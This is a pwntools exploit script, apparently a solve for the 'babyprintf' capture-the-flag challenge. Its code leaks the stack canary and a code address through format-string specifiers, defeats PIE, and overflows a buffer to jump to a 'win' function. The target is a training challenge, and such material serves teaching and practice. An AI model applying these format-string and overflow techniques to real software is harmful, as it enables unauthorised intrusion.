#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=baby-printf.challs.olicyber.it' '--port=34004'
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './babyprintf'

env = {
    "FLAG": "flag{placeholder}"
}

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'baby-printf.challs.olicyber.it'
port = int(args.PORT or 34004)
context.terminal = ['alacritty', '-e', 'zsh', '-c']

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw, env=env)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

elf = ELF(exe)

def leak_canary():
    payload = b"%11$p"
    io.sendlineafter(b":\n", payload)
    canary = io.recvline()
    canary = int(canary, 16)
    return canary

def leak_main():
    payload = b"%17$p"
    io.sendline(payload)
    leak = io.recvline()
    leak = int(leak, 16)
    return leak

io = start()

canary = leak_canary()
main_addr = leak_main()

pie_base = main_addr - elf.sym.main
elf.address = pie_base

win_addr = elf.sym.win

payload = b"A" * 40
payload += p64(canary)
payload += b"aaaaaaaa"
payload += p64(win_addr)

io.sendline(payload)

io.interactive()

